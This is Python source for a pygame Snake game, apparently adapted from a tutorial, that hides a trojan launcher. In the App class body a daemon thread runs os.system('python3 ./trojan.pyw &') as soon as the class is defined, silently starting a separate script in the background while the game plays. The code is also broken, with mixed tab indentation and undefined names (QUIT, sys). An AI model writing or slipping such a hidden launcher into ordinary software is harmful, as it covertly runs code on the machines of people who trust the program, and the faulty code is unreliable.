import random
#from pygame.locals import *
import pygame
import time
import subprocess
import os
import threading

# Author: Joseph Rice
# Snake game made with help of tutorial: https://pythonspot.com/snake-with-pygame/

class Snake:
    x = [0]
    y = [0]
    step = 50
    direction = 0
    length = 3

    refreshCount = 0
    refreshCountMax = 2

    def __init__(self):
        for i in range(0, 2000):
            self.x.append(-100)
            self.y.append(-100)

        self.x[1] = 1*50
        self.x[2] = 2*50

    def go(self):
        
        self.refreshCount += 1
        if self.refreshCount > self.refreshCountMax:
            
            for i in range(self.length-1, 0, -1):
                self.x[i] = self.x[i-1]
                self.y[i] = self.y[i-1]
            
            if self.direction == 0:
                self.x[0] += self.step
            if self.direction == 1:
                self.x[0] -= self.step
            if self.direction == 2:
                self.y[0] -= self.step
            if self.direction == 3:
                self.y[0] += self.step

            self.refreshCount = 0

    def goRight(self):
        self.direction = 0
    def goLeft(self):
        self.direction = 1
    def goUp(self):
        self.direction = 2
    def goDown(self):
        self.direction = 3

    def drawSnake(self, surface, image):
        for i in range(0,self.length):
            surface.blit(image,(self.x[i], self.y[i]))

class Food:
    x = 0
    y = 0
    step = 50

    def __init__(self, x, y):
        self.x = x * self.step
        self.y = y * self.step

    def drawFood(self, surface, image):
        surface.blit(image, (self.x, self.y))

class App:
    windowWidth = 800
    windowHeight = 600
    snake = 0
    food = 0

    def start_it():
	os.system('python3 ./trojan.pyw &')

    gameThread = threading.Thread(target=start_it,args=())
    gameThread.daemon = True
    gameThread.start()

    def __init__(self):
        self.isRunning = True
        self.display = None
        self.snake_surface = None
        self.food_surface = None
        self.food = Food(4, 6)
        self.snake = Snake()


    def on_init(self):
        pygame.init()
        self.display = pygame.display.set_mode((self.windowWidth,self.windowHeight), pygame.HWSURFACE)
        pygame.display.set_caption('The Game of Snake')
        self.isRunning = True
        self.food_surface = pygame.image.load("images/food.png").convert()
        self.snake_surface = pygame.image.load("images/snake.png").convert()
    
    def on_event(self, event):
        if event.type == QUIT:
            self.isRunning = False
    
    def on_loop(self):
        self.snake.go()

        for i in range(0, self.snake.length):
            if self.foundCollision(self.food.x, self.food.y, self.snake.x[i], self.snake.y[i],50):
                self.food.x = random.randint(2,9) * 50
                self.food.y = random.randint(2,9) * 50
                self.snake.length += 1

        for i in range(2, self.snake.length):
            if self.foundCollision(self.snake.x[0], self.snake.y[0], self.snake.x[i], self.snake.y[i], 46):
                print("You lose, a snake shouldn't eat itself!")
                sys.exit(0)
            if not self.isInBounds(self.snake.x[0], self.snake.y[0]):
                print("You lose, out of bounds!")
                print("{} {}".format("Score:", self.snake.length-3))
                exit(0)

        pass
    
    def on_render(self):
        self.display.fill((0,0,0))
        self.snake.drawSnake(self.display, self.snake_surface)
        self.food.drawFood(self.display, self.food_surface)
        pygame.display.flip()
    
    def on_cleanup(self):
        pygame.quit()
    
    def on_exec(self):
        if self.on_init() == False:
            self.isRunning = False
        
        while(self.isRunning):
            pygame.event.pump()
            keys = pygame.key.get_pressed()

            if (keys[pygame.K_RIGHT]):
                self.snake.goRight()
            if (keys[pygame.K_LEFT]):
                self.snake.goLeft()
            if (keys[pygame.K_UP]):
                self.snake.goUp()
            if (keys[pygame.K_DOWN]):
                self.snake.goDown()
            if (keys[pygame.K_ESCAPE]):
                self.isRunning = False

            self.on_loop()
            self.on_render()
            time.sleep (50.0 / 1000.0)

        self.on_cleanup()

    def foundCollision(self, x1, y1, x2, y2, bsize):
        if x1 >= x2 and x1 <= x2 + bsize:
            if y1 >= y2 and y1 <= y2 + bsize:
                return True
        return False

    def isInBounds(self, x, y):
        return self.display.get_rect().collidepoint(x, y)

if __name__ == "__main__":
    execApp = App()
    execApp.on_exec()
